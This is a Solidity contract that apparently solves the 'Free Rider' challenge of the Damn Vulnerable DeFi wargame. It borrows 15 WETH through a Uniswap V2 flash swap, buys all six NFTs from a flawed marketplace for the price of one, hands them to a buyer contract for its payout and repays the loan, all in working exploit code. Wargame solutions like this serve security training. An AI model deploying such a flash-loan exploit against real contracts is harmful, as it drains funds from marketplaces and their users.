// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";


abstract contract WETH{
function withdraw(uint wad) public virtual;
function deposit() public payable virtual;
function transfer(address dst, uint wad) public virtual returns (bool);
}

interface IUniswapV2Pair {
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract FreeRiderBuyerAttack is ERC721Holder{
    
    FreeRiderBuyer public immutable freeRiderBuyer;
    DamnValuableNFT public immutable damnValuableNFT;
    IUniswapV2Pair public immutable iUniswapV2Pair;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    WETH wETH;
    address public owner;

    constructor(address freeRiderBuyerAddress,FreeRiderNFTMarketplace freeRiderNFTMarketplaceAddress,address iUniswapV2PairAddress,address damnValuableNFTAddress,WETH _wETH) {
        freeRiderBuyer = FreeRiderBuyer(freeRiderBuyerAddress);
        damnValuableNFT=DamnValuableNFT(damnValuableNFTAddress);
        iUniswapV2Pair=IUniswapV2Pair(iUniswapV2PairAddress);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplaceAddress);
        wETH=_wETH;
        owner=msg.sender;
    }

    function flashLoan() external {
        require(msg.sender==owner,"only owner can call");

        iUniswapV2Pair.swap(15 ether, 0, address(this), "0x");
        payable(address(owner)).transfer(address(this).balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        uint256[] memory NFTamount=new uint256[](6);
        for(uint256 i;i<6;i++){
            NFTamount[i]=i;
        }
        wETH.withdraw(amount0);
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTamount);
        for(uint256 i;i<6;i++){
            damnValuableNFT.safeTransferFrom(address(this),address(freeRiderBuyer),i);        
        }
       
        wETH.deposit{value: 15.05 ether}();       
        wETH.transfer(address(iUniswapV2Pair),15.05 ether);
     
    }
    receive() payable external{

    }
}